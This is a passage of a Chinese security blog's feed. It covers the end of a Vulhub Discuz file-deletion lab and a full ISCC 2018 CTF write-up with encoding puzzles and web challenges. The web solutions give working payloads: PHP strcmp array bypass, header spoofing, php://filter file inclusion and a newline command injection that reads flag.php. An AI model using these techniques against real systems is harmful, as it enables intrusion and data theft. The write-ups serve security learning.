alt></p><p>说明我们的脏数据已经进入数据库了。</p><p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;[your-ip]&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;[form-hash]&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;birthprovince&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。</p><p>再次访问<code>http://your-ip/robots.txt</code>，发现文件成功被删除：</p><p><img src="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/26.png" alt></p><p>未完待续</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞&lt;/p&gt;
&lt;h2 id=&quot;Docker的安装和使用&quot;&gt;&lt;a href=&quot;#Docker的安装和使用&quot; class=&quot;headerlink&quot; title=&quot;Docker的安装和使用&quot;&gt;&lt;/a&gt;Docker的安装和使用&lt;/h2&gt;&lt;p&gt; 先推荐一个讲的比较详细的网站：&lt;a href=&quot;https://blog.csdn.net/zxcxq/article/details/77261716&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/zxcxq/article/details/77261716&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2018 wp</title>
    <link href="http://black0saturday.github.io/2018/05/25/ISCC2018-wp/"/>
    <id>http://black0saturday.github.io/2018/05/25/ISCC2018-wp/</id>
    <published>2018-05-25T09:13:55.000Z</published>
    <updated>2020-04-01T09:20:08.139Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="1-有趣的ISCC"><a href="#1-有趣的ISCC" class="headerlink" title="1.有趣的ISCC"></a>1.有趣的ISCC</h4><p><img src="/2018/05/25/ISCC2018-wp/1.png" alt></p><a id="more"></a><p>下载下来之后是一个图片，把后缀名改为txt之后打开看到文件末尾有一串特殊编码，<br><img src="/2018/05/25/ISCC2018-wp/2.png" alt><br>整理一下之后，老司机一看就知道这是HTML编码，网上有HTML的在线解码，解码后可以看到解码内容为</p><pre><code>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d</code></pre><p>然后将这一串编码再用unicode进行解码即可得到</p><pre><code>flag{iscc is fun}</code></pre><p>推荐一个解码网站：<br><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener" title="在线解码">http://tool.chinaz.com/tools/unicode.aspx</a></p><h4 id="2-What-is-that"><a href="#2-What-is-that" class="headerlink" title="2.What is that"></a>2.What is that</h4><p><img src="/2018/05/25/ISCC2018-wp/3.png" alt><br>打开后仍然是下载附件，下载下来也是个图片，<br><img src="/2018/05/25/ISCC2018-wp/4.png" alt><br>起初没什么头绪，不过，看到它的手指指着下边就想到是不是下边有东西，联想到这题是MISC的，就试试更改分辨率，看看下边是否有隐藏的东西，将图片的宽调成与长相等即可看到下边的内容<br><img src="/2018/05/25/ISCC2018-wp/5.png" alt></p><p>附上flag:</p><pre><code>Flag={_Welcome_To_ISCC_2018_}</code></pre><h3 id="3-Where-is-the-flag"><a href="#3-Where-is-the-flag" class="headerlink" title="3.Where is the flag"></a>3.Where is the flag</h3><p>下载下来是个图片，各种图片隐写的尝试都没什么用，抱着尝试的心思用firework cs5打开，发现这个图片后边还有隐藏的图片，全部分开后是9块小的图片，都是二维码，把9块小图片拼接在一起之后是一个完整的二维码，拿微信扫一扫就可以得到flag<br><img src="/2018/05/25/ISCC2018-wp/6.png" alt></p><pre><code>flag{a332b700-3621-11e7-a53b-6807154a58cf}</code></pre><h3 id="4-一只猫的心思"><a href="#4-一只猫的心思" class="headerlink" title="4.一只猫的心思"></a>4.一只猫的心思</h3><p>下载下来是一个图片，先用foremost抽离一下，发现有隐藏的东西，查看一下文件的二进制编码，我用的是010Editor，这里需要脑补一下，正常的jpg结尾都是FF D9的，图片查看器会忽视jpg结束符之后的内容，因此FF D9后边的东西就是这个题隐藏的数据，我们把它复制下来，另存为doc文档，打开后得到一串很像乱码的中文</p><pre><code>名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通</code></pre><p>其实只是特殊编码的字符，放到与佛论禅中解码<br><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>把我们的密文放到下边的框里，前边要加上 <code>如是我闻：</code>，然后点击参悟佛所言的真意，即可得到一串密文。<br><img src="/2018/05/25/ISCC2018-wp/7.png" alt></p><pre><codecode></pre><p>这个一看就是十六进制转换了，推荐一个在线十六进制转换的网站：<br><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">https://www.bejson.com/convert/ox2str/</a> </p><p>转换之后的结果就是这样：<br><img src="/2018/05/25/ISCC2018-wp/9.png" alt></p><pre><code>R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF</code></pre><p>得到的东西一看就是base64了，解码一下又是一串编码，<br><img src="/2018/05/25/ISCC2018-wp/10.png" alt><br>    GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E</p><p>分析它是base32编码，继续解码<br><img src="/2018/05/25/ISCC2018-wp/11.png" alt><br>    5231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D</p><p>然后再用十六进制：<br>    R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ==</p><p>再用base64：</p><pre><code>GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A====</code></pre><p>再用base32：</p><pre><code>463161395F69735F493563635F5A4F6C385F4733545030314E54</code></pre><p>再十六进制：</p><pre><code>F1a9_is_I5cc_ZOl8_G3TP01NT</code></pre><p>哇，终于出来了，这个出题人也是够有耐心的，这个题出的也是有点无语，几种编码方式反反复复的搞。</p><h3 id="5-凯撒十三世"><a href="#5-凯撒十三世" class="headerlink" title="5.凯撒十三世"></a>5.凯撒十三世</h3><pre><code>ebdgc697g95w3</code></pre><p>既然是凯撒十三世，没啥好说的网上的rot13在线解码<br><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p><p>解密后得到：</p><pre><code>roqtp697t95j3</code></pre><p>这个真的是快让我崩溃了，知道的编码方式都试了也没试出来<br>问了一下大佬怎么搞，知道了有一种叫键盘密码的东西<br><img src="/2018/05/25/ISCC2018-wp/12.png" alt><br>键盘解密就是键盘上每个按键的明文对应该按键右下边的按键<br>例如：R对应F  O对应L  Q对应A  。。。。<br>自己对照着用键盘解密后明文是</p><pre><code>flag:yougotme</code></pre><h3 id="6-重重谍影"><a href="#6-重重谍影" class="headerlink" title="6.重重谍影"></a>6.重重谍影</h3><p>这个题也稍微有点烦，打开网页得到一串密文，一看就是base64</p><pre><code>Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</code></pre><p>解密后仍然是base64，这时候末尾有url编码，需要用url解码，反正就是base64和url来回用，解到最后不能解的时候就是下面这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4</span><br><span class="line">B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z</span><br><span class="line">iN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc&#x3D;</span><br></pre></td></tr></table></figure></p><p>U2FsdGVkX1开头的，一看就是AES了，网上的在线解密工具：<br><a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">http://tool.oschina.net/encrypt/</a><br>得到的结果是：</p><pre><code>答案就是后面这句但已加密缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</code></pre><p><img src="/2018/05/25/ISCC2018-wp/13.png" alt></p><p>一看就知道，仍然是与佛论禅，网址上边已经给了，拿去解密一下：</p><p><img src="/2018/05/25/ISCC2018-wp/14.png" alt></p><pre><code>flag:   把我复制走</code></pre><h3 id="7-暴力XX不可取"><a href="#7-暴力XX不可取" class="headerlink" title="7.暴力XX不可取"></a>7.暴力XX不可取</h3><p>下载下来是个压缩包，解压需要密码，既然已经说了暴力破解不可取，那就别想着用暴力破解了，放到binwalk里面跑一下发现有个flag.txt文档<br><img src="/2018/05/25/ISCC2018-wp/15.png" alt><br>把它抽出来看到一串密文，</p><pre><code>vfppjrnerpbzvat</code></pre><p>熟悉的人一看就知道是rot加密了，但是不知道是几，没关系，全部来一遍<br>，都试了一遍之后发现用rot13得到的最顺，flag就是它啦：</p><pre><code>isccwearecoming</code></pre><h3 id="8-秘密电报"><a href="#8-秘密电报" class="headerlink" title="8.秘密电报"></a>8.秘密电报</h3><p>下载下来后是一串密文：</p><pre><code>ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</code></pre><p>这个题就是看你的积累是不是够丰富了，我一开始看到就不知道是什么，问了大佬才明白有一种加密叫培根密码<br>这里附上解密网址：</p><p><a href="https://netair.xyz/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html" target="_blank" rel="noopener">https://netair.xyz/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html</a></p><p>解密后得到：</p><pre><code>ILIKEISCCilikeiscc</code></pre><p><img src="/2018/05/25/ISCC2018-wp/16.png" alt><br>两个都试一试发现flag是小写</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-比较数字大小"><a href="#1-比较数字大小" class="headerlink" title="1.比较数字大小"></a>1.比较数字大小</h3><p>题目提示：只要比服务器上的数字大就可以了</p><p>打开后给了一个提交框，输入数字试一试只能输3位，最大也就是999，这时候提交仍然显示数字太小，做这个题有两个方法：</p><pre><code>1.抓包，利用burpsuite抓包后，修改数值，这时候可以输入任意位数，多输几个9就可以了，然后提交就会得到flag2.修改网页信息，按F12可以查看页面元素，这时候点一下定位按钮，把鼠标放到提交框上就会显示提交框的信息，然后修改一下限制的位数，再提交数字就可以随便就输入了。</code></pre><h3 id="2-WEB01"><a href="#2-WEB01" class="headerlink" title="2.WEB01"></a>2.WEB01</h3><p>打开后直接给了源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;); </span><br><span class="line">$flag&#x3D;&#39;&#123;***************&#125;&#39;; </span><br><span class="line">if (isset($_GET[&#39;password&#39;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&#39;password&#39;], $flag) &#x3D;&#x3D; 0)   </span><br><span class="line">        die(&#39;Flag: &#39;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &#39;Invalid password&#39;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP弱类型学web的人都知道，strcmp函数比较的时候如果传入的是数组，则该函数无法处理，就会返回0<br>所以直接GET传入password数组即可<br>给出payload：</p><pre><code>http://118.190.152.202:8003/?password[]=</code></pre><p>得到flag:</p><pre><code>Flag:ISCC{iscc_ef3w5r5tw_5rg5y6s3t3}</code></pre><h3 id="3-本地的诱惑"><a href="#3-本地的诱惑" class="headerlink" title="3.本地的诱惑"></a>3.本地的诱惑</h3><p>题目既然已经给了提示那就用burpsuite抓个包，修改一下包里的内容，加入一句话：<br>    X-Forwarded-For: 127.0.0.1<br>这样就行了，当然这是正规做法。<br>但是由于题目已经炸了，直接查看源码就可以看到flag<br><img src="/2018/05/25/ISCC2018-wp/17.png" alt></p><pre><code>key is ISCC{^&amp;*(UIHKJjkadshf}</code></pre><h3 id="4-你能跨过去么"><a href="#4-你能跨过去么" class="headerlink" title="4.你能跨过去么"></a>4.你能跨过去么</h3><p>题目说如果你对XSS了解就能做出来，打开后首先看到一串BASE64的编码<br><img src="/2018/05/25/ISCC2018-wp/18.png" alt><br>把中间的BASE64编码复制出来，拿到网上解码一下</p><pre><code>ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA</code></pre><p><img src="/2018/05/25/ISCC2018-wp/19.png" alt><br>虽然有一部分无法识别的，但是没关系把无法识别的去掉可以得到我们想要的东西：</p><pre><code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;</code></pre><p>把key的内容复制放到提交框里边，</p><pre><code>/%nsfocusXSStest%/</code></pre><p>提交便可得到弹窗：<br><img src="/2018/05/25/ISCC2018-wp/20.png" alt></p><pre><code>flag{HellOWorld}</code></pre><h3 id="5-web03-为什么这么简单啊"><a href="#5-web03-为什么这么简单啊" class="headerlink" title="5.web03 为什么这么简单啊"></a>5.web03 为什么这么简单啊</h3><p><img src="/2018/05/25/ISCC2018-wp/21.png" alt></p><p>这个题刚开始没看清楚是需要从<code>http://edu.xss.tv</code>进入，而不是要进入这个网页，做这个题只需要抓个包，然后修改包里的两个内容：</p><pre><code>X-Forwarded-For: 110.110.110.110Referer: http://edu.xss.tv</code></pre><p>然后发送这个包就进入第二关了<br><img src="/2018/05/25/ISCC2018-wp/22.png" alt></p><p>不知道哪里有密码，查看一下页面的源码，看到有一个<code>password.js</code><br><img src="/2018/05/25/ISCC2018-wp/23.png" alt></p><p>访问一下该页面得到了一串BASE64编码<br><img src="/2018/05/25/ISCC2018-wp/24.png" alt><br>BASE64解码一下：<br><img src="/2018/05/25/ISCC2018-wp/25.png" alt><br>看到解码出来的东西不要慌，把里面无法识别的内容去掉可以得到我们要的东西：<br>    <script>alert(“password:xinyiji.com”)</script></p><p>那么密码就是：<code>xinyiji.com</code>        把它提交到第二关的提交框内就可以得到flag</p><h3 id="6-web6-有个文件忘记删了"><a href="#6-web6-有个文件忘记删了" class="headerlink" title="6.web6 有个文件忘记删了"></a>6.web6 有个文件忘记删了</h3><p>打开后只有一个页面，上边显示：flag is here<br>各种文件泄露尝试之后发现有个隐藏文件：<code>index.php.txt</code><br>访问一下得到网页的源码</p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;]) )    die($_403);foreach ($_GET as $k =&gt; $v){    $$k = $$v;}foreach ($_POST as $k =&gt; $v){    $$k = $v;}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><p>代码审计之后很明显是变量覆盖：<br>首先GET传入<code>_200=flag</code>，这样在第一个foreach完成之后变量flag的值就被赋值给了变量_200，然后POST传入flag=1，这样便能保证在第二个foreach里边我们传入的变量flag的值与此时的_200的相等，然后下边的if条件便不成立，代码便会执行到最后输出变量_200的值，而之前我们已经把flag的值赋值给了变量_200，因此输出的变量_200的值便是flag:</p><pre><code>ISCC{taolu2333333....}</code></pre><h3 id="7-你能绕过么"><a href="#7-你能绕过么" class="headerlink" title="7.你能绕过么"></a>7.你能绕过么</h3><p>哇，这个题目是真的坑啊，第一眼看上去都以为是注入题，各种注入都试了仍然没有头绪，以为是自己太菜，有哪种自己不知道的注入方法，问了大佬才知道这个题考察的是伪协议，（太菜.png）</p><p>由于题目过滤了php，因此用伪协议时需要用大小写混淆</p><p>直接payload：</p><pre><code>http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=1</code></pre><p>得到网页的源码：</p><pre><code>&lt;?php    #ISCC{LFIOOOOOOOOOOOOOO}    if(isset($_GET[&apos;f&apos;])){        if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False){            die(&quot;error...&quot;);        }        else{            include($_GET[&apos;f&apos;] . &apos;.php&apos;);        }    }?&gt;</code></pre><p>flag就在源码里边了：</p><pre><code>ISCC{LFIOOOOOOOOOOOOOO}</code></pre><h3 id="8-web02"><a href="#8-web02" class="headerlink" title="8.web02"></a>8.web02</h3><p>进去后直接显示：错误你的IP不是本机IP！<br>老套路：抓包改包，加上<code>X-Forwarded-For: 127.0.0.1</code>发现我们的万金油竟然不好使了。</p><p>可能时网页的检测机制检测的不是这个IP了，网上搜一搜伪装IP的方法发现还有另一个：client-ip<br>这里脑补一下：client-ip是客户端IP地址，X-Forwarded-For是从哪个网页来的那个IP地址，因此这个题抓包把客户端IP内容加上即可。</p><pre><code>Client-ip: 127.0.0.1</code></pre><p>提交后即可得到flag:</p><pre><code>ISCC{iscc_059eeb8c0c33eb62}</code></pre><h3 id="9-请PING我的IP，看你能PING通么"><a href="#9-请PING我的IP，看你能PING通么" class="headerlink" title="9.请PING我的IP，看你能PING通么"></a>9.请PING我的IP，看你能PING通么</h3><p>进去后发现没什么东西，既然让PING它的IP，那就试一试给它个IP参数</p><p><img src="/2018/05/25/ISCC2018-wp/27.png" alt></p><p>发现它是可以执行命令的，那就是命令执行了，由于不能连续执行两个命令，于是在第一个命令的最后要输入一个%0a,然后输入第二个命令。（%0a的意思就是换行，带上它之后系统就可以连续执行两个命令）<br>这里直接给出payload：</p><pre><code>http://118.190.152.202:8018/?ip=127.0.0.1%0acd ..%0acd ..%0acd ..%0acd ..%0acat flag.php</code></pre><p>由于flag不在当前目录下，因此我们要让目录往上边切换，做题的时候是每切换一次就要用ls命令试一试有没有我们需要的flag文件，最后测试在flag在/home目录下<br>有一个flag.php，这时候再用cat命令查看一下该文件的内容即可看到flag</p><pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></pre><h3 id="10-PLEASE-GIVE-ME-USERNAME-AND-PASSWORD"><a href="#10-PLEASE-GIVE-ME-USERNAME-AND-PASSWORD" class="headerlink" title="10.PLEASE GIVE ME USERNAME AND PASSWORD!"></a>10.PLEASE GIVE ME USERNAME AND PASSWORD!</h3><p>页面打开之后没有任何提示，查看源码也没有。不过既然提示了give me username and password ，那么GET给它一个username和password试一试，<br><img src="/2018/05/25/ISCC2018-wp/28.png" alt><br>返回的页面好像还是没什么软用，查看一下源代码发现了好东西，里面有一个index.php.txt文件，然后访问一下试试：</p><pre><code>http://118.190.152.202:8017/index.php.txt</code></pre><p>得到了网页的源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&#39;username&#39;]))&#123;</span><br><span class="line">if (0 &#x3D;&#x3D; strcasecmp($flag,$_GET[&#39;username&#39;]))&#123;</span><br><span class="line">$a &#x3D; fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;Please give me username or password!&#39;;</span><br><span class="line">if (isset($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (is_numeric($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (strlen($_GET[&#39;password&#39;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&#39;password&#39;] &gt; 999)&#123;</span><br><span class="line">$b &#x3D; g;</span><br><span class="line">print &#39;&lt;p&gt;very good!Password is right&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else </span><br><span class="line">print &#39;&lt;p&gt;Password too little&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password too long&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password is not numeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>代码审计可以分析出来username只需要传入成数组就可以返回成0.<br>而password有些麻烦，只能是三位但是还要大于999，表面看起来好像不可能啊，其实可以利用科学记数法，1e3就是10的三次方，占用3位数，其值为1000，刚好满足，这里给出payload：</p><pre><code>http://118.190.152.202:8017/index.php?username[]=&amp;password=1e3</code></pre><p>得到flag：</p><pre><code>flag{ISCC2018_Very_GOOD!}</code></pre><h3 id="11-试试看"><a href="#11-试试看" class="headerlink" 